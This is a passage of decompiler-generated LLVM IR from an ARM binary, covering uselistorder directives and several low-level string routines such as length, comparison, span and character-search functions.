  uselistorder i32 %v0_153d8, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_153d0, { 1, 0 }
  uselistorder i32 %v1_153c8, { 2, 1, 0 }
  uselistorder i32 %v2_153c0, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_153c0, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_153bc, { 1, 0 }
  uselistorder i32 %v2_153b0, { 1, 0 }
  uselistorder i32 %v1_153b0, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_153b0, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 15, 16, 17, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 26, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* %r2.global-to-local, { 0, 69, 1, 2, 3, 4, 5, 70, 6, 7, 8, 9, 10, 71, 11, 12, 67, 68, 72, 28, 13, 14, 16, 15, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 29, 30, 62, 31, 32, 33, 34, 35, 63, 36, 37, 38, 39, 40, 64, 41, 42, 43, 44, 45, 65, 46, 47, 48, 50, 49, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 66 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 0, 56, 2, 4, 6, 8, 5, 57, 7, 9, 11, 54, 10, 58, 53, 55, 59, 62, 60, 66, 67, 12, 13, 14, 16, 15, 17, 18, 61, 19, 20, 63, 21, 64, 22, 65, 23, 24, 25, 26, 27, 30, 28, 40, 29, 31, 34, 32, 41, 33, 35, 38, 36, 42, 37, 39, 43, 44, 47, 45, 48, 46, 49, 50, 51, 52 }
  uselistorder i32* %r0.global-to-local, { 0, 28, 1, 2, 29, 3, 4, 30, 5, 27, 33, 34, 6, 7, 19, 8, 10, 9, 11, 12, 31, 13, 14, 32, 15, 16, 17, 18, 20, 21, 23, 22, 24, 25, 26 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 35, 36, 37, 6, 7, 8, 9, 10, 11, 12, 13, 14, 23, 15, 16, 17, 24, 18, 19, 20, 25, 21, 22, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 46, 47, 11, 12, 13, 14, 15, 16, 17, 18, 3, 19, 20, 21, 22, 23, 2, 24, 0, 25, 1, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 44, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20, 21, 22, 2, 23, 0, 24, 1, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 49, 50, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20, 21, 22, 23, 24, 2, 25, 0, 26, 1, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 -3, { 0, 4, 5, 3, 1, 2 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1, 6 }
  uselistorder i32 15, { 27, 28, 29, 0, 38, 1, 39, 30, 31, 6, 32, 7, 33, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 3, 2, 18, 19, 20, 21, 22, 23, 24, 25, 34, 26, 35, 4, 36, 5, 37 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 28, 2, 4, 5, 3, 6, 7, 8, 9, 17, 33, 38, 36, 37, 35, 29, 30, 21, 22, 31, 32, 34, 24, 25, 26, 18, 27, 23, 11, 12, 10, 13, 14, 15, 16, 19, 20, 0, 1 }
  uselistorder i32 -5, { 1, 0, 2, 3 }
  uselistorder i32 11, { 8, 9, 10, 20, 28, 29, 2, 11, 3, 12, 4, 13, 14, 15, 16, 5, 17, 18, 19, 21, 22, 6, 24, 7, 25, 0, 26, 1, 27, 23 }
  uselistorder i32 -12, { 0, 12, 13, 1, 15, 16, 2, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 22, 6, 3, 5, 4, 23 }
  uselistorder i32 48, { 0, 2, 4, 12, 3, 5, 6, 13, 14, 8, 9, 10, 11, 18, 19, 20, 15, 16, 7, 17, 1 }
  uselistorder i32 40, { 3, 9, 11, 4, 2, 7, 6, 10, 12, 8, 13, 14, 15, 5, 16, 17, 0, 18, 20, 19, 21, 1, 22, 24, 23 }
  uselistorder i32 36, { 4, 19, 5, 6, 7, 20, 8, 17, 9, 18, 10, 11, 12, 0, 1, 13, 2, 14, 3, 15, 16 }
  uselistorder i32 -16, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 5, 4, 3, 1, 15, 16, 17, 18, 19, 20, 2, 0 }
  uselistorder i32 31, { 4, 5, 6, 7, 0, 1, 2, 3 }
  uselistorder i32 -32, { 3, 2, 4, 0, 1, 5 }
  uselistorder i32 24, { 0, 59, 60, 61, 62, 8, 9, 10, 12, 11, 13, 1, 14, 63, 64, 65, 15, 66, 16, 17, 67, 18, 58, 91, 92, 54, 55, 56, 57, 19, 20, 21, 22, 108, 109, 23, 110, 24, 2, 25, 93, 94, 26, 95, 52, 53, 27, 84, 85, 86, 81, 76, 68, 69, 70, 71, 72, 73, 74, 75, 77, 78, 79, 80, 82, 83, 87, 88, 89, 90, 28, 98, 29, 99, 30, 100, 31, 32, 33, 34, 35, 101, 36, 37, 3, 38, 39, 40, 4, 41, 42, 5, 43, 44, 102, 45, 6, 103, 46, 104, 105, 106, 107, 47, 48, 7, 111, 49, 112, 50, 96, 51, 97 }
  uselistorder i32 27, { 1, 0, 5, 2, 3, 4, 6 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32* @lr, { 147, 148, 149, 150, 151, 152, 153, 154, 155, 3, 4, 5, 6, 7, 8, 9, 10, 11, 2, 54, 55, 34, 156, 157, 12, 13, 113, 114, 115, 116, 117, 118, 110, 111, 112, 119, 132, 133, 120, 121, 122, 123, 124, 125, 126, 1, 127, 128, 130, 131, 129, 41, 42, 43, 44, 45, 46, 134, 135, 136, 47, 137, 56, 14, 15, 16, 17, 18, 0, 22, 23, 19, 20, 21, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 36, 37, 38, 39, 40, 48, 49, 50, 51, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 138, 139, 140, 141, 142, 143, 144, 145, 146, 52, 53 }
  uselistorder label %dec_label_pc_15820, { 2, 0, 1 }
  uselistorder label %dec_label_pc_157b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15748, { 2, 0, 1 }
  uselistorder label %dec_label_pc_156e8, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 3, 7, 0, 1, 2 }
  uselistorder label %dec_label_pc_15674, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_15638, { 1, 0 }
  uselistorder label %dec_label_pc_15624, { 1, 0 }
  uselistorder label %dec_label_pc_155e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15578, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1550c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_154ac, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_1547c, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_15418, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_153d8, { 1, 0 }
}

define i32 @function_15840(i32 %arg1) local_unnamed_addr {
dec_label_pc_15840:
  %v1_15840 = and i32 %arg1, -4
  %v1_15844 = inttoptr i32 %v1_15840 to i32*
  %v2_15844 = load i32, i32* %v1_15844, align 4
  %v1_15848 = urem i32 %arg1, 4
  store i32 %v1_15848, i32* @r3, align 4
  %v2_15848 = icmp eq i32 %v1_15848, 0
  %v1_1584c = sub nsw i32 0, %v1_15848
  br i1 %v2_15848, label %.preheader.preheader, label %dec_label_pc_15854

dec_label_pc_15854:                               ; preds = %dec_label_pc_15840
  %v1_15854 = or i32 %v2_15844, 255
  %v7_15858 = icmp eq i32 %v1_15848, 1
  br i1 %v7_15858, label %bb33, label %bb

bb:                                               ; preds = %dec_label_pc_15854
  %v9_1585c = or i32 %v2_15844, 65535
  br label %bb33

bb33:                                             ; preds = %dec_label_pc_15854, %bb
  %v8_15864 = phi i32 [ %v1_15854, %dec_label_pc_15854 ], [ %v9_1585c, %bb ]
  %v1_15860 = add nsw i32 %v1_15848, -2
  store i32 %v1_15860, i32* @r3, align 4
  %v7_15864 = icmp eq i32 %v1_15848, 3
  br i1 %v7_15864, label %bb34, label %.preheader.preheader

bb34:                                             ; preds = %bb33
  %v9_15864 = or i32 %v8_15864, 16711680
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %bb33, %bb34, %dec_label_pc_15840
  %v1_15874.ph = phi i32 [ %v2_15844, %dec_label_pc_15840 ], [ %v9_15864, %bb34 ], [ %v8_15864, %bb33 ]
  %v1_1586838 = urem i32 %v1_15874.ph, 256
  %v2_1586839 = icmp eq i32 %v1_1586838, 0
  %v2_1586c40 = and i32 %v1_15874.ph, 65280
  %v3_1586c41 = icmp eq i32 %v2_1586c40, 0
  %or.cond42 = or i1 %v2_1586839, %v3_1586c41
  %v2_1587043 = and i32 %v1_15874.ph, 16711680
  %v3_1587044 = icmp eq i32 %v2_1587043, 0
  %or.cond3145 = or i1 %v3_1587044, %or.cond42
  %v4_1587446 = icmp ult i32 %v1_15874.ph, 16777216
  %or.cond3247 = or i1 %v4_1587446, %or.cond3145
  br i1 %or.cond3247, label %dec_label_pc_15884, label %.thread4

.thread4:                                         ; preds = %.preheader.preheader, %.thread4
  %v1_158781349 = phi i32 [ %v2_1587814, %.thread4 ], [ %v1_1584c, %.preheader.preheader ]
  %v1_1587c48.in = phi i32 [ %v1_1587c48, %.thread4 ], [ %v1_15840, %.preheader.preheader ]
  %v1_1587c48 = add i32 %v1_1587c48.in, 4
  %v2_1587814 = add i32 %v1_158781349, 4
  %v2_1587c = inttoptr i32 %v1_1587c48 to i32*
  %v3_1587c = load i32, i32* %v2_1587c, align 4
  %v1_15868 = urem i32 %v3_1587c, 256
  %v2_15868 = icmp eq i32 %v1_15868, 0
  %v2_1586c = and i32 %v3_1587c, 65280
  %v3_1586c = icmp eq i32 %v2_1586c, 0
  %or.cond = or i1 %v2_15868, %v3_1586c
  %v2_15870 = and i32 %v3_1587c, 16711680
  %v3_15870 = icmp eq i32 %v2_15870, 0
  %or.cond31 = or i1 %v3_15870, %or.cond
  %v4_15874 = icmp ult i32 %v3_1587c, 16777216
  %or.cond32 = or i1 %v4_15874, %or.cond31
  br i1 %or.cond32, label %dec_label_pc_15884, label %.thread4

dec_label_pc_15884:                               ; preds = %.thread4, %.preheader.preheader
  %v1_1587813.lcssa = phi i32 [ %v1_1584c, %.preheader.preheader ], [ %v2_1587814, %.thread4 ]
  %v2_15868.lcssa = phi i1 [ %v2_1586839, %.preheader.preheader ], [ %v2_15868, %.thread4 ]
  %v3_1586c.lcssa = phi i1 [ %v3_1586c41, %.preheader.preheader ], [ %v3_1586c, %.thread4 ]
  %v3_15870.lcssa = phi i1 [ %v3_1587044, %.preheader.preheader ], [ %v3_15870, %.thread4 ]
  br i1 %v2_15868.lcssa, label %.thread10, label %bb35

bb35:                                             ; preds = %dec_label_pc_15884
  %v2_15888 = add i32 %v1_1587813.lcssa, 1
  br i1 %v3_1586c.lcssa, label %.thread10, label %bb36

bb36:                                             ; preds = %bb35
  %v2_1589017 = add i32 %v1_1587813.lcssa, 2
  br i1 %v3_15870.lcssa, label %.thread10, label %bb37

bb37:                                             ; preds = %bb36
  %v2_15898 = add i32 %v1_1587813.lcssa, 3
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_15884, %bb35, %bb36, %bb37
  %v1_1589c = phi i32 [ %v2_15888, %bb35 ], [ %v2_1589017, %bb36 ], [ %v2_15898, %bb37 ], [ %v1_1587813.lcssa, %dec_label_pc_15884 ]
  ret i32 %v1_1589c

; uselistorder directives
  uselistorder i32 %v1_1587813.lcssa, { 1, 3, 2, 0 }
  uselistorder i32 %v3_1587c, { 3, 2, 1, 0 }
  uselistorder i32 %v1_15874.ph, { 1, 2, 3, 0 }
  uselistorder i32 %v1_15848, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 16711680, { 2, 0, 5, 1, 4, 3, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 6 }
  uselistorder i32 -2, { 1, 3, 4, 2, 6, 7, 8, 0, 5, 9, 25, 24, 26, 27, 28, 17, 18, 19, 20, 21, 22, 23, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 65535, { 2, 105, 0, 1, 10, 11, 3, 4, 24, 23, 27, 53, 26, 54, 12, 13, 5, 28, 55, 29, 56, 57, 14, 58, 25, 30, 59, 31, 60, 32, 61, 62, 63, 33, 64, 65, 15, 66, 6, 37, 67, 36, 68, 34, 69, 35, 70, 71, 16, 72, 7, 73, 74, 41, 75, 40, 76, 38, 77, 39, 78, 18, 17, 79, 80, 42, 81, 43, 82, 20, 19, 83, 84, 44, 85, 45, 86, 87, 88, 46, 89, 90, 91, 92, 21, 93, 94, 8, 47, 95, 48, 96, 49, 97, 98, 99, 22, 100, 101, 9, 52, 102, 50, 103, 51, 104 }
  uselistorder i32 -4, { 41, 18, 62, 63, 64, 6, 19, 20, 21, 65, 66, 67, 7, 22, 23, 24, 68, 69, 70, 8, 25, 26, 71, 17, 16, 72, 73, 74, 15, 14, 13, 12, 27, 28, 29, 30, 31, 5, 32, 3, 33, 4, 75, 11, 34, 49, 50, 51, 9, 52, 53, 54, 35, 48, 2, 36, 42, 43, 44, 45, 46, 47, 0, 1, 55, 56, 57, 58, 59, 60, 61, 37, 38, 39, 40, 10 }
  uselistorder label %.thread10, { 3, 2, 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0, 2 }
  uselistorder label %bb33, { 1, 0 }
}

define i32 @function_158a0(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_158a4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_158a0

dec_label_pc_158a0:                               ; preds = %bb3, %bb
  %v0_158a4 = phi i32 [ %v0_158a4.pre, %bb ], [ %v5_158a4, %bb3 ]
  %v0_158a0 = phi i32 [ %tmp, %bb ], [ %v5_158a0, %bb3 ]
  %v1_158a0 = inttoptr i32 %v0_158a0 to i8*
  %v2_158a0 = load i8, i8* %v1_158a0, align 1
  %v1_158a4 = inttoptr i32 %v0_158a4 to i8*
  %v2_158a4 = load i8, i8* %v1_158a4, align 1
  %v3_158a4 = zext i8 %v2_158a4 to i32
  %v2_158a8 = icmp eq i8 %v2_158a0, 0
  br i1 %v2_158a8, label %.dec_label_pc_158b4_crit_edge, label %bb3

bb3:                                              ; preds = %dec_label_pc_158a0
  %v5_158a4 = add i32 %v0_158a4, 1
  %v5_158a0 = add i32 %v0_158a0, 1
  %v3_158a0 = zext i8 %v2_158a0 to i32
  %v10_158ac = icmp eq i8 %v2_158a0, %v2_158a4
  br i1 %v10_158ac, label %dec_label_pc_158a0, label %dec_label_pc_158b4

.dec_label_pc_158b4_crit_edge:                    ; preds = %dec_label_pc_158a0
  br label %dec_label_pc_158b4

dec_label_pc_158b4:                               ; preds = %bb3, %.dec_label_pc_158b4_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_158b4_crit_edge ], [ %v3_158a0, %bb3 ]
  %v2_158b4.pre-phi = sub nsw i32 %.pn, %v3_158a4
  ret i32 %v2_158b4.pre-phi

; uselistorder directives
  uselistorder i8 %v2_158a0, { 0, 2, 1 }
  uselistorder i32 %v0_158a0, { 1, 0 }
  uselistorder i32 %v0_158a4, { 1, 0 }
  uselistorder label %dec_label_pc_158b4, { 1, 0 }
}

define i32 @function_158c0() local_unnamed_addr {
dec_label_pc_158c0:
  %stack_var_-16 = alloca i32, align 4
  %v3_158c0 = load i32, i32* @r4, align 4
  store i32 %v3_158c0, i32* %stack_var_-16, align 4
  %v6_158c0 = load i32, i32* @r5, align 4
  %v9_158c0 = load i32, i32* @r6, align 4
  %v0_158c4 = load i32, i32* @r0, align 4
  %v0_158c8 = load i32, i32* @r1, align 4
  store i32 %v0_158c8, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_158e48 = inttoptr i32 %v0_158c4 to i8*
  %v2_158e49 = load i8, i8* %v1_158e48, align 1
  %v2_158e811 = icmp eq i8 %v2_158e49, 0
  store i32 %v0_158c8, i32* @r0, align 4
  %v1_158f012 = add i32 %v0_158c4, 1
  store i32 %v1_158f012, i32* @r4, align 4
  br i1 %v2_158e811, label %dec_label_pc_158f8, label %dec_label_pc_158d4

dec_label_pc_158d4:                               ; preds = %dec_label_pc_158c0, %dec_label_pc_158e0
  %v3_158e414.in = phi i8 [ %v2_158e4, %dec_label_pc_158e0 ], [ %v2_158e49, %dec_label_pc_158c0 ]
  %v0_158ec13 = phi i32 [ %v0_158ec.pre, %dec_label_pc_158e0 ], [ %v0_158c8, %dec_label_pc_158c0 ]
  %v3_158e414 = zext i8 %v3_158e414.in to i32
  %v2_158d4 = call i32 @function_15a8c(i32 %v0_158ec13, i32 %v3_158e414)
  %v2_158d8 = icmp eq i32 %v2_158d4, 0
  %v0_158e0 = load i32, i32* @r5, align 4
  br i1 %v2_158d8, label %dec_label_pc_158e0, label %dec_label_pc_158f8

dec_label_pc_158e0:                               ; preds = %dec_label_pc_158d4
  %v1_158e0 = add i32 %v0_158e0, 1
  %v0_158e4.pre = load i32, i32* @r4, align 4
  %v0_158ec.pre = load i32, i32* @r6, align 4
  store i32 %v1_158e0, i32* @r5, align 4
  %v1_158e4 = inttoptr i32 %v0_158e4.pre to i8*
  %v2_158e4 = load i8, i8* %v1_158e4, align 1
  %v2_158e8 = icmp eq i8 %v2_158e4, 0
  store i32 %v0_158ec.pre, i32* @r0, align 4
  %v1_158f0 = add i32 %v0_158e4.pre, 1
  store i32 %v1_158f0, i32* @r4, align 4
  br i1 %v2_158e8, label %dec_label_pc_158f8, label %dec_label_pc_158d4

dec_label_pc_158f8:                               ; preds = %dec_label_pc_158e0, %dec_label_pc_158d4, %dec_label_pc_158c0
  %v0_158f8 = phi i32 [ 0, %dec_label_pc_158c0 ], [ %v0_158e0, %dec_label_pc_158d4 ], [ %v1_158e0, %dec_label_pc_158e0 ]
  %v2_158fc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_158fc, i32* @r4, align 4
  store i32 %v6_158c0, i32* @r5, align 4
  store i32 %v9_158c0, i32* @r6, align 4
  ret i32 %v0_158f8

; uselistorder directives
  uselistorder i8 %v2_158e4, { 1, 0 }
  uselistorder i32 %v0_158ec.pre, { 1, 0 }
  uselistorder i32 %v0_158e4.pre, { 1, 0 }
  uselistorder i32* @r6, {}
  uselistorder label %dec_label_pc_158d4, { 1, 0 }
}

define i32 @function_15904(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15904:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_159342 = load i32, i32* @r0, align 4
  %v1_159343 = inttoptr i32 %v0_159342 to i8*
  %v2_159344 = load i8, i8* %v1_159343, align 1
  %v3_159345 = zext i8 %v2_159344 to i32
  store i32 %v3_159345, i32* @ip, align 4
  %v2_159386 = icmp eq i8 %v2_159344, 0
  br i1 %v2_159386, label %dec_label_pc_15944, label %dec_label_pc_15918.preheader

dec_label_pc_15910:                               ; preds = %dec_label_pc_15918
  %v3_15918 = zext i8 %v2_15918 to i32
  %v1_15920 = add i32 %v0_15920, 1
  %v9_15910 = icmp eq i32 %v0_1591010, %v3_15918
  br i1 %v9_15910, label %dec_label_pc_1592c, label %dec_label_pc_15918

dec_label_pc_15918:                               ; preds = %dec_label_pc_15918.preheader, %dec_label_pc_15910
  %v0_15920 = phi i32 [ %tmp, %dec_label_pc_15918.preheader ], [ %v1_15920, %dec_label_pc_15910 ]
  %v1_15918 = inttoptr i32 %v0_15920 to i8*
  %v2_15918 = load i8, i8* %v1_15918, align 1
  %v2_1591c = icmp eq i8 %v2_15918, 0
  br i1 %v2_1591c, label %dec_label_pc_15944, label %dec_label_pc_15910

dec_label_pc_1592c:                               ; preds = %dec_label_pc_15910
  %v1_1592c = add i32 %v0_1592c, 1
  %v1_15930 = add i32 %v0_15930, 1
  %v1_15934 = inttoptr i32 %v1_15930 to i8*
  %v2_15934 = load i8, i8* %v1_15934, align 1
  %v3_15934 = zext i8 %v2_15934 to i32
  store i32 %v3_15934, i32* @ip, align 4
  %v2_15938 = icmp eq i8 %v2_15934, 0
  br i1 %v2_15938, label %dec_label_pc_15944, label %dec_label_pc_15918.preheader

dec_label_pc_15918.preheader:                     ; preds = %dec_label_pc_15904, %dec_label_pc_1592c
  %v0_15930 = phi i32 [ %v1_15930, %dec_label_pc_1592c ], [ %v0_159342, %dec_label_pc_15904 ]
  %v0_1592c = phi i32 [ %v1_1592c, %dec_label_pc_1592c ], [ 0, %dec_label_pc_15904 ]
  %v0_1591010 = phi i32 [ %v3_15934, %dec_label_pc_1592c ], [ %v3_159345, %dec_label_pc_15904 ]
  br label %dec_label_pc_15918

dec_label_pc_15944:                               ; preds = %dec_label_pc_1592c, %dec_label_pc_15918, %dec_label_pc_15904
  %v0_15944 = phi i32 [ 0, %dec_label_pc_15904 ], [ %v0_1592c, %dec_label_pc_15918 ], [ %v1_1592c, %dec_label_pc_1592c ]
  ret i32 %v0_15944

; uselistorder directives
  uselistorder i32 %v0_15920, { 1, 0 }
  uselistorder label %dec_label_pc_15918.preheader, { 1, 0 }
}

define i32 @function_15950(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15950:
  store i32 %arg1, i32* @r0, align 4
  %v1_15954 = urem i32 %arg2, 256
  store i32 %v1_15954, i32* @r4, align 4
  %v2_15954 = icmp eq i32 %v1_15954, 0
  br i1 %v2_15954, label %dec_label_pc_15968, label %dec_label_pc_1597c.preheader

dec_label_pc_1597c.preheader:                     ; preds = %dec_label_pc_15950
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_159843 = call i32 @function_15a8c(i32 %arg1, i32 %v1_15954)
  %v2_159885 = icmp eq i32 %v2_159843, 0
  br i1 %v2_159885, label %dec_label_pc_15990, label %dec_label_pc_15974

dec_label_pc_15968:                               ; preds = %dec_label_pc_15950
  %v2_1596c = call i32 @function_15a8c(i32 %arg1, i32 0)
  br label %dec_label_pc_15994

dec_label_pc_15974:                               ; preds = %dec_label_pc_1597c.preheader, %dec_label_pc_15974
  %v2_159846 = phi i32 [ %v2_15984, %dec_label_pc_15974 ], [ %v2_159843, %dec_label_pc_1597c.preheader ]
  store i32 %v2_159846, i32* @r5, align 4
  %v1_15978 = add i32 %v2_159846, 1
  store i32 %v1_15978, i32* @r0, align 4
  %v0_15980 = load i32, i32* @r4, align 4
  %v2_15984 = call i32 @function_15a8c(i32 %v1_15978, i32 %v0_15980)
  %v2_15988 = icmp eq i32 %v2_15984, 0
  br i1 %v2_15988, label %dec_label_pc_15990, label %dec_label_pc_15974

dec_label_pc_15990:                               ; preds = %dec_label_pc_15974, %dec_label_pc_1597c.preheader
  %v0_15990 = load i32, i32* @r5, align 4
  br label %dec_label_pc_15994

dec_label_pc_15994:                               ; preds = %dec_label_pc_15968, %dec_label_pc_15990
  %storemerge = phi i32 [ %v2_1596c, %dec_label_pc_15968 ], [ %v0_15990, %dec_label_pc_15990 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_15984, { 1, 0 }
  uselistorder i32 %v1_15978, { 1, 0 }
  uselistorder i32 %v1_15954, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_15a8c, { 2, 1, 0, 5, 3, 4 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_15994, { 1, 0 }
  uselistorder label %dec_label_pc_15974, { 1, 0 }
}

define i32 @function_159a0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_159a0:
  %v1_159a4 = urem i32 %arg1, 256
  %v0_159c42 = load i32, i32* @r0, align 4
  %v1_159c43 = urem i32 %v0_159c42, 4
  %v2_159c44 = icmp eq i32 %v1_159c43, 0
  br i1 %v2_159c44, label %dec_label_pc_159cc, label %dec_label_pc_159ac

dec_label_pc_159ac:                               ; preds = %dec_label_pc_159a0, %dec_label_pc_159c0
  %v0_159c0 = phi i32 [ %v1_159c0, %dec_label_pc_159c0 ], [ %v0_159c42, %dec_label_pc_159a0 ]
  %v1_159ac = inttoptr i32 %v0_159c0 to i8*
  %v2_159ac = load i8, i8* %v1_159ac, align 1
  %v3_159ac = zext i8 %v2_159ac to i32
  %v9_159b0 = icmp eq i32 %v3_159ac, %v1_159a4
  br i1 %v9_159b0, label %dec_label_pc_15a7c, label %dec_label_pc_159b8

dec_label_pc_159b8:                               ; preds = %dec_label_pc_159ac
  %v2_159b8 = icmp eq i8 %v2_159ac, 0
  br i1 %v2_159b8, label %dec_label_pc_15a7c, label %dec_label_pc_159c0

dec_label_pc_159c0:                               ; preds = %dec_label_pc_159b8
  %v1_159c0 = add i32 %v0_159c0, 1
  %v1_159c4 = urem i32 %v1_159c0, 4
  %v2_159c4 = icmp eq i32 %v1_159c4, 0
  br i1 %v2_159c4, label %dec_label_pc_159cc, label %dec_label_pc_159ac

dec_label_pc_159cc:                               ; preds = %dec_label_pc_159c0, %dec_label_pc_159a0
  %v0_159d0 = phi i32 [ %v0_159c42, %dec_label_pc_159a0 ], [ %v1_159c0, %dec_label_pc_159c0 ]
  %v4_159cc = mul nuw nsw i32 %v1_159a4, 256
  %v5_159cc = or i32 %v4_159cc, %v1_159a4
  %v4_159d4 = mul i32 %v5_159cc, 65536
  %v5_159d4 = or i32 %v4_159d4, %v5_159cc
  br label %dec_label_pc_159d8

dec_label_pc_159d8:                               ; preds = %dec_label_pc_15a74, %dec_label_pc_15a14, %dec_label_pc_159cc
  %v0_15a3c = phi i32 [ %v0_159d0, %dec_label_pc_159cc ], [ %v4_159d8, %dec_label_pc_15a14 ], [ %v4_159d8, %dec_label_pc_15a74 ]
  %v1_159d8 = inttoptr i32 %v0_15a3c to i32*
  %v2_159d8 = load i32, i32* %v1_159d8, align 4
  %v4_159d8 = add i32 %v0_15a3c, 4
  %v2_159e0 = xor i32 %v2_159d8, %v5_159d4
  %v2_159e4 = add i32 %v2_159e0, 2130640639
  store i32 %v2_159e4, i32* @ip, align 4
  %v2_159ec = add i32 %v2_159d8, 2130640639
  %v1_159f0 = sub i32 -1, %v2_159d8
  %v2_159f4 = xor i32 %v2_159ec, %v1_159f0
  %v2_15a00 = and i32 %v2_159f4, -2130640640
  %v2_15a08 = icmp eq i32 %v2_15a00, 0
  br i1 %v2_15a08, label %dec_label_pc_15a14, label %dec_label_pc_15a1c

dec_label_pc_15a14:                               ; preds = %dec_label_pc_159d8
  %v1_159fc = sub i32 -1, %v2_159e0
  %v2_15a04 = xor i32 %v2_159e4, %v1_159fc
  %v2_15a0c = and i32 %v2_15a04, -2130640640
  %v2_15a14 = icmp eq i32 %v2_15a0c, 0
  br i1 %v2_15a14, label %dec_label_pc_159d8, label %dec_label_pc_15a1c

dec_label_pc_15a1c:                               ; preds = %dec_label_pc_159d8, %dec_label_pc_15a14
  %v2_15a1c = inttoptr i32 %v0_15a3c to i8*
  %v3_15a1c = load i8, i8* %v2_15a1c, align 1
  %v4_15a1c = zext i8 %v3_15a1c to i32
  %v9_15a20 = icmp eq i32 %v4_15a1c, %v1_159a4
  br i1 %v9_15a20, label %dec_label_pc_15a7c, label %dec_label_pc_15a2c

dec_label_pc_15a2c:                               ; preds = %dec_label_pc_15a1c
  %v2_15a2c = icmp eq i8 %v3_15a1c, 0
  br i1 %v2_15a2c, label %dec_label_pc_15a7c, label %dec_label_pc_15a34

dec_label_pc_15a34:                               ; preds = %dec_label_pc_15a2c
  %v1_15a34 = add i32 %v0_15a3c, 1
  %v2_15a34 = inttoptr i32 %v1_15a34 to i8*
  %v3_15a34 = load i8, i8* %v2_15a34, align 1
  %v4_15a34 = zext i8 %v3_15a34 to i32
  %v9_15a38 = icmp eq i32 %v4_15a34, %v1_159a4
